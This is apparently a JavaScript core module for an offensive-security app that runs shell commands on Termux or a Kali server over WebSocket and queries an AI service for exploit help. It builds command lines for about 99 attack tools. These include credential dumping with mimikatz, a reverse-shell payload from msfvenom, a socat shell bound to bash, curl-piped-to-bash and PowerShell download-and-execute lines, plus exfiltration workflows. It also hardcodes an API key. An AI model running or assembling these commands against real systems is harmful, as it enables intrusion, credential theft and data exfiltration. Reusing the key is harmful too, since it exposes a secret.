// NEXUS Core Service — Real tool execution via WebSocket + mr7.ai AI
// Supports: Termux local (ws://localhost:8765) + Remote Kali VPS

const MR7_API_KEY = 'mr7_PpqKs39MBPvsk4xHu9TTtISu0adSL-P2eeODXrLJ6ulda_nluWmBs1tU8b22myvF';
const MR7_BASE_URL = 'https://api.mr7.ai/v1';

// Model IDs
export const MR7_MODELS = {
  KALIGPT_FAST:    { id: 'kaligpt-v6-fast',     label: 'KaliGPT v6 Fast',      color: '#00FF41', desc: 'Speed-optimized for quick recon & tool selection' },
  KALIGPT_THINK:   { id: 'kaligpt-thinking-v7', label: 'KaliGPT Thinking v7',  color: '#00F0FF', desc: 'Deep reasoning for complex attack chains' },
  ZERODAY_CODER:   { id: '0day-coder',           label: '0Day Coder',           color: '#FFB000', desc: 'Exploit development & PoC generation' },
  DARKGPT:         { id: 'darkgpt-v3',           label: 'DarkGPT v3',           color: '#FF3B30', desc: 'Dark web intel & threat actor TTPs' },
  ONION_GPT:       { id: 'onion-gpt',            label: 'Onion GPT',            color: '#9B59B6', desc: 'Tor-aware OSINT & hidden service recon' },
};

// ─── WebSocket Connection Manager ───────────────────────────────────────────

class WSManager {
  constructor() {
    this.localWS = null;
    this.remoteWS = null;
    this.localConnected = false;
    this.remoteConnected = false;
    this.pendingCallbacks = new Map();
    this.outputListeners = new Set();
    this.msgId = 0;
  }

  // Local Termux connection
  connectLocal(url = 'ws://localhost:8765') {
    return new Promise((resolve) => {
      try {
        this.localWS = new WebSocket(url);
        this.localWS.onopen = () => {
          this.localConnected = true;
          resolve({ ok: true, mode: 'local' });
        };
        this.localWS.onmessage = (e) => this._handleMessage(e, 'local');
        this.localWS.onclose = () => { this.localConnected = false; };
        this.localWS.onerror = () => resolve({ ok: false, mode: 'local' });
        setTimeout(() => { if (!this.localConnected) resolve({ ok: false, mode: 'local' }); }, 5000);
      } catch {
        resolve({ ok: false, mode: 'local' });
      }
    });
  }

  // Remote Kali VPS connection
  connectRemote(url) {
    return new Promise((resolve) => {
      try {
        this.remoteWS = new WebSocket(url);
        this.remoteWS.onopen = () => {
          this.remoteConnected = true;
          resolve({ ok: true, mode: 'remote' });
        };
        this.remoteWS.onmessage = (e) => this._handleMessage(e, 'remote');
        this.remoteWS.onclose = () => { this.remoteConnected = false; };
        this.remoteWS.onerror = () => resolve({ ok: false, mode: 'remote' });
        setTimeout(() => { if (!this.remoteConnected) resolve({ ok: false, mode: 'remote' }); }, 8000);
      } catch {
        resolve({ ok: false, mode: 'remote' });
      }
    });
  }

  _handleMessage(event, source) {
    try {
      const data = JSON.parse(event.data);
      // Stream output to listeners
      if (data.type === 'output' || data.type === 'stderr') {
        this.outputListeners.forEach(fn => fn({ source, ...data }));
      }
      // Resolve pending command callbacks
      if (data.id && this.pendingCallbacks.has(data.id)) {
        const cb = this.pendingCallbacks.get(data.id);
        this.pendingCallbacks.delete(data.id);
        cb(data);
      }
    } catch { /* raw text output */ 
      this.outputListeners.forEach(fn => fn({ source, type: 'output', data: event.data }));
    }
  }

  // Execute command, prefer remote if connected, fallback to local
  exec(command, mode = 'auto') {
    return new Promise((resolve, reject) => {
      const id = ++this.msgId;
      const msg = JSON.stringify({ id, type: 'exec', command });

      const useRemote = (mode === 'remote' || mode === 'auto') && this.remoteConnected;
      const useLocal = (mode === 'local' || (!useRemote && mode === 'auto')) && this.localConnected;

      if (!useRemote && !useLocal) {
        reject(new Error('No WebSocket connection available. Connect to Termux or remote server in Settings.'));
        return;
      }

      const timeout = setTimeout(() => {
        this.pendingCallbacks.delete(id);
        reject(new Error('Command timed out'));
      }, 300000); // 5 min timeout

      this.pendingCallbacks.set(id, (data) => {
        clearTimeout(timeout);
        resolve(data);
      });

      if (useRemote) {
        this.remoteWS.send(msg);
      } else {
        this.localWS.send(msg);
      }
    });
  }

  // Stream exec — fires outputListeners in real-time, resolves on done
  execStream(command, onOutput, mode = 'auto') {
    const listener = (data) => onOutput(data);
    this.outputListeners.add(listener);
    return this.exec(command, mode).finally(() => {
      this.outputListeners.delete(listener);
    });
  }

  addOutputListener(fn) { this.outputListeners.add(fn); }
  removeOutputListener(fn) { this.outputListeners.delete(fn); }

  getStatus() {
    return {
      local: this.localConnected,
      remote: this.remoteConnected,
    };
  }

  disconnectAll() {
    this.localWS?.close();
    this.remoteWS?.close();
    this.localConnected = false;
    this.remoteConnected = false;
  }
}

export const wsManager = new WSManager();

// ─── mr7.ai API Client ───────────────────────────────────────────────────────

class Mr7Client {
  constructor(apiKey = MR7_API_KEY) {
    this.apiKey = apiKey;
  }

  setApiKey(key) { this.apiKey = key; }

  async chat(messages, model = MR7_MODELS.KALIGPT_FAST.id, opts = {}) {
    const res = await fetch(`${MR7_BASE_URL}/chat/completions`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Authorization': `Bearer ${this.apiKey}`,
      },
      body: JSON.stringify({
        model,
        messages,
        stream: opts.stream || false,
        temperature: opts.temperature ?? 0.7,
        max_tokens: opts.max_tokens ?? 4096,
        ...opts,
      }),
    });

    if (!res.ok) {
      const err = await res.text();
      throw new Error(`mr7.ai API error ${res.status}: ${err}`);
    }

    if (opts.stream) {
      return res; // caller handles ReadableStream
    }

    const data = await res.json();
    return data.choices?.[0]?.message?.content || '';
  }

  // Streaming chat — calls onChunk with each text delta
  async chatStream(messages, model, onChunk, opts = {}) {
    const res = await fetch(`${MR7_BASE_URL}/chat/completions`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Authorization': `Bearer ${this.apiKey}`,
      },
      body: JSON.stringify({ model, messages, stream: true, ...opts }),
    });

    if (!res.ok) throw new Error(`mr7.ai error: ${res.status}`);

    const reader = res.body.getReader();
    const decoder = new TextDecoder();
    let full = '';

    while (true) {
      const { done, value } = await reader.read();
      if (done) break;
      const chunk = decoder.decode(value);
      const lines = chunk.split('\n').filter(l => l.startsWith('data: '));
      for (const line of lines) {
        const json = line.slice(6);
        if (json === '[DONE]') continue;
        try {
          const obj = JSON.parse(json);
          const delta = obj.choices?.[0]?.delta?.content || '';
          if (delta) { full += delta; onChunk(delta, full); }
        } catch { /* skip malformed */ }
      }
    }
    return full;
  }

  // Threat Intelligence Search
  async threatIntelSearch(query) {
    const res = await fetch(`${MR7_BASE_URL}/threat-intel/search`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Authorization': `Bearer ${this.apiKey}`,
      },
      body: JSON.stringify({ query, limit: 50 }),
    });
    if (!res.ok) throw new Error(`Threat Intel error: ${res.status}`);
    return res.json();
  }

  // CVE/Exploit lookup
  async exploitSearch(query) {
    const res = await fetch(`${MR7_BASE_URL}/exploits/search`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json', 'Authorization': `Bearer ${this.apiKey}` },
      body: JSON.stringify({ query }),
    });
    if (!res.ok) throw new Error(`Exploit search error: ${res.status}`);
    return res.json();
  }

  // Credential exposure check
  async credentialCheck(email_or_domain) {
    const res = await fetch(`${MR7_BASE_URL}/threat-intel/credentials`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json', 'Authorization': `Bearer ${this.apiKey}` },
      body: JSON.stringify({ query: email_or_domain }),
    });
    if (!res.ok) throw new Error(`Credential check error: ${res.status}`);
    return res.json();
  }

  // IOC lookup
  async iocLookup(ioc) {
    const res = await fetch(`${MR7_BASE_URL}/threat-intel/ioc`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json', 'Authorization': `Bearer ${this.apiKey}` },
      body: JSON.stringify({ ioc }),
    });
    if (!res.ok) throw new Error(`IOC lookup error: ${res.status}`);
    return res.json();
  }

  // Code analysis
  async analyzeCode(code, language = 'auto') {
    const messages = [
      { role: 'system', content: 'You are a security code analyzer. Identify vulnerabilities, backdoors, and security issues. Be precise.' },
      { role: 'user', content: `Analyze this ${language} code for security issues:\n\n\`\`\`${language}\n${code}\n\`\`\`` }
    ];
    return this.chat(messages, MR7_MODELS.ZERODAY_CODER.id);
  }
}

export const mr7 = new Mr7Client();

// ─── Tool Command Builder ────────────────────────────────────────────────────

export function buildCommand(toolId, params) {
  const p = params;
  const commands = {
    // Network
    nmap:       `nmap ${p.options || '-sV -sC'} -p ${p.port || '1-1000'} ${p.target}`,
    netcat:     `nc ${p.options || '-v'} ${p.target} ${p.port || '80'}`,
    masscan:    `masscan ${p.target} -p${p.port || '1-65535'} --rate ${p.rate || '10000'}`,
    hping3:     `hping3 ${p.options || '--syn'} -p ${p.port || '80'} ${p.target}`,
    arp_scan:   `arp-scan ${p.options || '--localnet'} ${p.target || ''}`,
    tcpdump:    `tcpdump ${p.options || '-i any'} ${p.filter || ''} -c ${p.count || '100'}`,
    ettercap:   `ettercap -T -q -i ${p.interface || 'eth0'} -M arp:remote /${p.target}// //`,
    responder:  `responder -I ${p.interface || 'eth0'} ${p.options || '-wrf'}`,
    wireshark:  `tshark -i ${p.interface || 'any'} ${p.filter ? `-f "${p.filter}"` : ''} -c ${p.count || '100'}`,
    
    // Web
    nikto:      `nikto -h ${p.target} ${p.port ? `-p ${p.port}` : ''} ${p.options || ''}`,
    dirb:       `dirb ${p.target} ${p.wordlist || '/usr/share/dirb/wordlists/common.txt'} ${p.options || ''}`,
    sqlmap:     `sqlmap -u "${p.target}" --level=${p.level || '3'} --risk=${p.risk || '2'} --batch ${p.options || ''}`,
    gobuster:   `gobuster dir -u ${p.target} -w ${p.wordlist || '/usr/share/wordlists/dirb/common.txt'} -t ${p.threads || '50'} ${p.options || ''}`,
    wpscan:     `wpscan --url ${p.target} --enumerate ${p.enumerate || 'vp,vt,u'} ${p.options || ''}`,
    burpsuite:  `java -jar /opt/burpsuite/burpsuite_pro.jar ${p.options || '--headless'}`,
    ffuf:       `ffuf -u ${p.target || 'http://TARGET/FUZZ'} -w ${p.wordlist || '/usr/share/wordlists/dirb/common.txt'} -t ${p.threads || '50'} ${p.options || ''}`,
    whatweb:    `whatweb ${p.options || '-a 3'} ${p.target}`,
    xsstrike:   `xsstrike -u "${p.target}" ${p.options || ''}`,
    commix:     `commix --url="${p.target}" ${p.options || '--batch'}`,
    
    // Password
    hydra:      `hydra -l ${p.user || 'admin'} -P ${p.wordlist || '/usr/share/wordlists/rockyou.txt'} ${p.target} ${p.service || 'ssh'} -s ${p.port || '22'} ${p.options || ''}`,
    john:       `john ${p.hash || 'hash.txt'} --wordlist=${p.wordlist || '/usr/share/wordlists/rockyou.txt'} --format=${p.format || 'auto'} ${p.options || ''}`,
    hashcat:    `hashcat -m ${p.mode || '0'} ${p.hash || 'hashes.txt'} ${p.wordlist || '/usr/share/wordlists/rockyou.txt'} ${p.options || ''}`,
    medusa:     `medusa -h ${p.target} -u ${p.user || 'admin'} -P ${p.wordlist || '/usr/share/wordlists/rockyou.txt'} -M ${p.module || 'ssh'} ${p.options || ''}`,
    cewl:       `cewl ${p.target} -d ${p.depth || '2'} -m ${p.minlength || '5'} -w ${p.output || 'wordlist.txt'}`,
    crunch:     `crunch ${p.min || '8'} ${p.max || '8'} ${p.charset || 'abcdefghijklmnopqrstuvwxyz0123456789'} -o ${p.output || 'wordlist.txt'}`,
    ophcrack:   `ophcrack -g -d ${p.tables || '/usr/share/ophcrack/tables'} -f ${p.hashes || 'hashes.txt'}`,
    mimikatz:   `mimikatz "${p.command || 'sekurlsa::logonpasswords'}" exit`,
    
    // Exploitation
    metasploit: `msfconsole -q -x "use ${p.module || 'exploit/multi/handler'}; set LHOST ${p.lhost || '0.0.0.0'}; set LPORT ${p.lport || '4444'}; ${p.options || 'run'}"`,
    searchsploit: `searchsploit ${p.options || '-w'} "${p.query || ''}"`,
    msfvenom:   `msfvenom -p ${p.payload || 'windows/meterpreter/reverse_tcp'} LHOST=${p.lhost || '0.0.0.0'} LPORT=${p.lport || '4444'} -f ${p.format || 'exe'} -o ${p.output || 'payload.exe'}`,
    beef:       `beef-xss ${p.options || '-c /etc/beef-xss/config.yaml'}`,
    empire:     `powershell-empire ${p.command || 'server'} ${p.options || ''}`,
    
    // Wireless
    aircrack_ng: `aircrack-ng ${p.capture || 'capture.cap'} -w ${p.wordlist || '/usr/share/wordlists/rockyou.txt'} ${p.options || ''}`,
    reaver:     `reaver -i ${p.interface || 'wlan0mon'} -b ${p.bssid || 'XX:XX:XX:XX:XX:XX'} ${p.options || '-vv'}`,
    wifite:     `wifite ${p.options || '--all'} ${p.interface ? `-i ${p.interface}` : ''}`,
    kismet:     `kismet ${p.options || ''} ${p.interface ? `-c ${p.interface}` : ''}`,
    bettercap:  `bettercap ${p.interface ? `-iface ${p.interface}` : ''} ${p.options || ''}`,
    
    // Recon
    whois:      `whois ${p.target}`,
    theHarvester: `theHarvester -d ${p.target} -b ${p.sources || 'google,bing,linkedin'} ${p.options || ''}`,
    maltego:    `maltego ${p.options || ''}`,
    recon_ng:   `recon-ng ${p.options || ''}`,
    shodan:     `shodan search "${p.query || p.target}" ${p.options || '--limit 50'}`,
    dnsrecon:   `dnsrecon -d ${p.target} -t ${p.type || 'std'} ${p.options || ''}`,
    subfinder:  `subfinder -d ${p.target} ${p.sources ? `-s ${p.sources}` : ''} ${p.options || ''}`,
    amass:      `amass enum -d ${p.target} ${p.options || ''}`,
    spiderfoot: `spiderfoot -s ${p.target} -t ${p.modules || 'all'} ${p.options || ''}`,
    censys:     `censys search "${p.query || p.target}" ${p.options || ''}`,
    
    // Forensics
    volatility: `vol.py -f ${p.memory || 'memory.dmp'} --profile=${p.profile || 'Win10x64'} ${p.plugin || 'pslist'}`,
    autopsy:    `autopsy ${p.options || ''}`,
    binwalk:    `binwalk ${p.extract === 'true' ? '-e' : ''} ${p.options || ''} ${p.file || 'firmware.bin'}`,
    foremost:   `foremost -i ${p.file || 'image.dd'} -o ${p.output || '/tmp/foremost'} ${p.options || ''}`,
    exiftool:   `exiftool ${p.all === 'true' ? '-a' : ''} "${p.file || 'file'}" ${p.options || ''}`,
    sleuthkit:  `fls ${p.options || '-r'} ${p.image || 'disk.img'}`,
    bulk_extractor: `bulk_extractor ${p.file || 'image.dd'} -o ${p.output || '/tmp/bulk'} ${p.options || ''}`,
    
    // Social Engineering
    setoolkit:  `setoolkit ${p.options || ''}`,
    gophish:    `gophish ${p.options || ''}`,
    evilginx:   `evilginx ${p.options || ''}`,
    
    // Exfiltration
    dnscat2:    `dnscat2 ${p.server ? `--dns server=${p.server}` : ''} ${p.domain || ''} ${p.options || ''}`,
    iodine:     `iodine ${p.server || ''} ${p.domain || ''} ${p.options || ''}`,
    chisel:     `chisel ${p.mode || 'server'} -p ${p.port || '8080'} ${p.options || ''}`,
    proxychains: `proxychains ${p.command || 'bash'} ${p.options || ''}`,
    socat:      `socat ${p.source || 'TCP-LISTEN:4444,fork'} ${p.dest || 'EXEC:/bin/bash'}`,
    stunnel:    `stunnel ${p.config || '/etc/stunnel/stunnel.conf'}`,
    cloakify:   `cloakify.py ${p.file || 'data.zip'} ${p.cipher || '/opt/cloakify/ciphers/pokemon.txt'} ${p.output || 'encoded.txt'}`,
    
    // Post-Exploitation
    bloodhound: `bloodhound-python -d ${p.domain || 'corp.local'} -u ${p.user || 'user'} -p ${p.password || 'pass'} -c ${p.collection || 'All'} ${p.options || ''}`,
    sharphound: `SharpHound.exe -c ${p.collection || 'All'} --domain ${p.domain || 'corp.local'} ${p.options || ''}`,
    linpeas:    `curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | bash ${p.options || ''}`,
    winpeas:    `winpeas.exe ${p.options || 'all'}`,
    lazagne:    `laZagne.exe ${p.target || 'all'} ${p.options || ''}`,
    rubeus:     `Rubeus.exe ${p.command || 'kerberoast'} /domain:${p.domain || 'corp.local'} ${p.options || ''}`,
    seatbelt:   `Seatbelt.exe ${p.checks || '-group=all'} ${p.options || ''}`,
    crackmapexec: `crackmapexec ${p.protocol || 'smb'} ${p.target} ${p.user ? `-u ${p.user}` : ''} ${p.password ? `-p ${p.password}` : ''} ${p.options || ''}`,
    evil_winrm: `evil-winrm -i ${p.target} -u ${p.user || 'administrator'} -p ${p.password || ''} ${p.options || ''}`,
    impacket:   `impacket-${p.tool || 'secretsdump'} ${p.domain ? `${p.domain}/` : ''}${p.user || 'administrator'}:${p.password || ''}@${p.target} ${p.options || ''}`,
    pspy:       `pspy${p.bits || '64'} ${p.options || ''}`,
    powersploit: `powershell -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://${p.server || '127.0.0.1'}/${p.script || 'PowerUp.ps1'}')"`,
    
    // Pivoting
    sshuttle:   `sshuttle -r ${p.user || 'root'}@${p.target} ${p.subnet || '10.10.10.0/24'} ${p.options || ''}`,
    ligolo:     `ligolo-proxy -selfcert -laddr 0.0.0.0:${p.port || '11601'} ${p.options || ''}`,
    rpivot:     `python rpivot/server.py --proxy-port ${p.port || '9050'} ${p.options || ''}`,
    reGeorg:    `python reGeorgSocksProxy.py -p ${p.port || '9050'} -u ${p.url || 'http://target/tunnel.php'} ${p.options || ''}`,
    plink:      `plink.exe -R ${p.rport || '4444'}:localhost:${p.lport || '4444'} ${p.user || 'user'}@${p.server}`,
    netsh:      `netsh interface portproxy add v4tov4 listenport=${p.lport || '4444'} listenaddress=0.0.0.0 connectport=${p.rport || '4444'} connectaddress=${p.target}`,
  };

  return commands[toolId] || `${toolId} ${Object.values(params).join(' ')}`;
}

// ─── Session Storage (localStorage) ─────────────────────────────────────────

const SESSIONS_KEY = 'nexus_sessions';
const SETTINGS_KEY = 'nexus_settings';

export const sessionStore = {
  getSessions: () => JSON.parse(localStorage.getItem(SESSIONS_KEY) || '[]'),
  saveSessions: (s) => localStorage.setItem(SESSIONS_KEY, JSON.stringify(s)),
  createSession: (name = 'New Session') => {
    const s = { id: crypto.randomUUID(), name, created: Date.now(), messages: [] };
    const all = sessionStore.getSessions();
    all.unshift(s);
    sessionStore.saveSessions(all);
    return s;
  },
  deleteSession: (id) => {
    sessionStore.saveSessions(sessionStore.getSessions().filter(s => s.id !== id));
  },
  updateSession: (id, messages) => {
    const all = sessionStore.getSessions();
    const idx = all.findIndex(s => s.id === id);
    if (idx >= 0) { all[idx].messages = messages; sessionStore.saveSessions(all); }
  },
  getMessages: (id) => {
    return sessionStore.getSessions().find(s => s.id === id)?.messages || [];
  },
};

export const settingsStore = {
  get: () => JSON.parse(localStorage.getItem(SETTINGS_KEY) || '{}'),
  set: (k, v) => {
    const s = settingsStore.get();
    s[k] = v;
    localStorage.setItem(SETTINGS_KEY, JSON.stringify(s));
  },
  getAll: () => ({
    termuxUrl:   'ws://localhost:8765',
    remoteUrl:   '',
    mr7ApiKey:   MR7_API_KEY,
    defaultModel: MR7_MODELS.KALIGPT_FAST.id,
    execMode:    'auto', // auto | local | remote
    ...settingsStore.get(),
  }),
};

// Tools data (all 99 tools)
export const TOOLS_DATA = {
  network: [
    { id: 'nmap', name: 'nmap', description: 'Port scanner & service detection' },
    { id: 'netcat', name: 'netcat', description: 'TCP/UDP network utility' },
    { id: 'masscan', name: 'masscan', description: 'Fast port scanner' },
    { id: 'hping3', name: 'hping3', description: 'TCP/IP packet assembler' },
    { id: 'arp_scan', name: 'arp-scan', description: 'ARP host discovery' },
    { id: 'tcpdump', name: 'tcpdump', description: 'Packet capture' },
    { id: 'wireshark', name: 'tshark', description: 'Network protocol analyzer' },
    { id: 'ettercap', name: 'ettercap', description: 'MITM framework' },
    { id: 'responder', name: 'responder', description: 'LLMNR/NBT-NS poisoner' },
  ],
  web: [
    { id: 'nikto', name: 'nikto', description: 'Web server scanner' },
    { id: 'dirb', name: 'dirb', description: 'Directory brute-force' },
    { id: 'sqlmap', name: 'sqlmap', description: 'SQL injection automation' },
    { id: 'gobuster', name: 'gobuster', description: 'Dir/DNS/vhost bruteforcer' },
    { id: 'wpscan', name: 'wpscan', description: 'WordPress scanner' },
    { id: 'burpsuite', name: 'burpsuite', description: 'Web proxy & scanner' },
    { id: 'ffuf', name: 'ffuf', description: 'Fast web fuzzer' },
    { id: 'whatweb', name: 'whatweb', description: 'Web fingerprinting' },
    { id: 'xsstrike', name: 'XSStrike', description: 'XSS detection suite' },
    { id: 'commix', name: 'commix', description: 'Command injection exploiter' },
  ],
  password: [
    { id: 'hydra', name: 'hydra', description: 'Online password cracker' },
    { id: 'john', name: 'john', description: 'John the Ripper hash cracker' },
    { id: 'hashcat', name: 'hashcat', description: 'GPU hash cracker' },
    { id: 'medusa', name: 'medusa', description: 'Parallel login brute-forcer' },
    { id: 'cewl', name: 'cewl', description: 'Custom wordlist generator' },
    { id: 'crunch', name: 'crunch', description: 'Wordlist generator' },
    { id: 'ophcrack', name: 'ophcrack', description: 'Rainbow table cracker' },
    { id: 'mimikatz', name: 'mimikatz', description: 'Windows credential dumper' },
  ],
  exploitation: [
    { id: 'metasploit', name: 'metasploit', description: 'Exploitation framework' },
    { id: 'searchsploit', name: 'searchsploit', description: 'Exploit DB searcher' },
    { id: 'msfvenom', name: 'msfvenom', description: 'Payload generator' },
    { id: 'beef', name: 'beef-xss', description: 'Browser exploitation framework' },
    { id: 'empire', name: 'empire', description: 'PowerShell post-exploitation' },
  ],
  wireless: [
    { id: 'aircrack_ng', name: 'aircrack-ng', description: 'WiFi cracking suite' },
    { id: 'reaver', name: 'reaver', description: 'WPS PIN brute-force' },
    { id: 'wifite', name: 'wifite', description: 'Automated WiFi auditor' },
    { id: 'kismet', name: 'kismet', description: 'Wireless sniffer/IDS' },
    { id: 'bettercap', name: 'bettercap', description: 'WiFi/BLE/Ethernet MITM' },
  ],
  recon: [
    { id: 'whois', name: 'whois', description: 'Domain registration lookup' },
    { id: 'theHarvester', name: 'theHarvester', description: 'Email/subdomain OSINT' },
    { id: 'maltego', name: 'maltego', description: 'Visual link analysis' },
    { id: 'recon_ng', name: 'recon-ng', description: 'Recon framework' },
    { id: 'shodan', name: 'shodan', description: 'Internet-connected device search' },
    { id: 'dnsrecon', name: 'dnsrecon', description: 'DNS enumeration' },
    { id: 'subfinder', name: 'subfinder', description: 'Subdomain discovery' },
    { id: 'amass', name: 'amass', description: 'Attack surface mapping' },
    { id: 'spiderfoot', name: 'spiderfoot', description: 'Automated OSINT' },
    { id: 'censys', name: 'censys', description: 'Internet scan search engine' },
  ],
  forensics: [
    { id: 'volatility', name: 'volatility', description: 'Memory forensics' },
    { id: 'autopsy', name: 'autopsy', description: 'Digital forensics platform' },
    { id: 'binwalk', name: 'binwalk', description: 'Firmware analysis' },
    { id: 'foremost', name: 'foremost', description: 'File recovery tool' },
    { id: 'exiftool', name: 'exiftool', description: 'Metadata reader/writer' },
    { id: 'sleuthkit', name: 'sleuthkit', description: 'Filesystem analysis' },
    { id: 'bulk_extractor', name: 'bulk_extractor', description: 'Feature extractor' },
  ],
  social: [
    { id: 'setoolkit', name: 'setoolkit', description: 'Social engineering toolkit' },
    { id: 'gophish', name: 'gophish', description: 'Phishing framework' },
    { id: 'evilginx', name: 'evilginx', description: '2FA bypass phishing' },
  ],
  exfiltration: [
    { id: 'dnscat2', name: 'dnscat2', description: 'DNS C2 tunnel' },
    { id: 'iodine', name: 'iodine', description: 'IPv4 over DNS tunnel' },
    { id: 'chisel', name: 'chisel', description: 'TCP/UDP tunnel over HTTP' },
    { id: 'proxychains', name: 'proxychains', description: 'Proxy chain redirector' },
    { id: 'socat', name: 'socat', description: 'Multipurpose relay' },
    { id: 'stunnel', name: 'stunnel', description: 'SSL tunnel' },
    { id: 'cloakify', name: 'cloakify', description: 'Data exfil camouflage' },
  ],
  postexploit: [
    { id: 'bloodhound', name: 'bloodhound', description: 'AD attack path mapper' },
    { id: 'sharphound', name: 'sharphound', description: 'BloodHound data collector' },
    { id: 'linpeas', name: 'linpeas', description: 'Linux privilege escalation' },
    { id: 'winpeas', name: 'winpeas', description: 'Windows privilege escalation' },
    { id: 'lazagne', name: 'lazagne', description: 'Credential recovery tool' },
    { id: 'rubeus', name: 'rubeus', description: 'Kerberos attack toolkit' },
    { id: 'seatbelt', name: 'seatbelt', description: 'Host situational awareness' },
    { id: 'crackmapexec', name: 'crackmapexec', description: 'SMB/WinRM mass exploitation' },
    { id: 'evil_winrm', name: 'evil-winrm', description: 'WinRM shell' },
    { id: 'impacket', name: 'impacket', description: 'Windows protocol collection' },
    { id: 'pspy', name: 'pspy', description: 'Process monitoring (no root)' },
    { id: 'powersploit', name: 'powersploit', description: 'PowerShell exploitation' },
  ],
  pivoting: [
    { id: 'sshuttle', name: 'sshuttle', description: 'SSH-based VPN' },
    { id: 'ligolo', name: 'ligolo-ng', description: 'Reverse tunnel tool' },
    { id: 'rpivot', name: 'rpivot', description: 'SOCKS4 pivot' },
    { id: 'reGeorg', name: 'reGeorg', description: 'SOCKS5 web tunnel' },
    { id: 'plink', name: 'plink', description: 'PuTTY tunnel utility' },
    { id: 'netsh', name: 'netsh', description: 'Windows port forwarding' },
  ],
};

export const WORKFLOWS = [
  { id: 'quick_recon', name: 'Quick Recon', tools: ['whois', 'nmap', 'dnsrecon', 'whatweb'] },
  { id: 'web_audit', name: 'Web App Audit', tools: ['nikto', 'gobuster', 'wpscan', 'sqlmap', 'xsstrike'] },
  { id: 'net_sweep', name: 'Network Sweep', tools: ['arp_scan', 'nmap', 'masscan', 'netcat'] },
  { id: 'cred_audit', name: 'Credential Audit', tools: ['hydra', 'john', 'hashcat', 'crackmapexec'] },
  { id: 'ad_attack', name: 'AD Attack Chain', tools: ['bloodhound', 'rubeus', 'mimikatz', 'impacket'] },
  { id: 'exfil_setup', name: 'Exfil Setup', tools: ['chisel', 'dnscat2', 'proxychains', 'cloakify'] },
  { id: 'linux_pe', name: 'Linux PrivEsc', tools: ['linpeas', 'pspy', 'searchsploit'] },
  { id: 'windows_pe', name: 'Windows PrivEsc', tools: ['winpeas', 'seatbelt', 'powersploit', 'rubeus'] },
  { id: 'lateral', name: 'Lateral Movement', tools: ['crackmapexec', 'evil_winrm', 'impacket', 'sshuttle'] },
  { id: 'full_pentest', name: 'Full Pentest', tools: ['nmap', 'nikto', 'sqlmap', 'hydra', 'metasploit', 'bloodhound', 'linpeas'] },
];
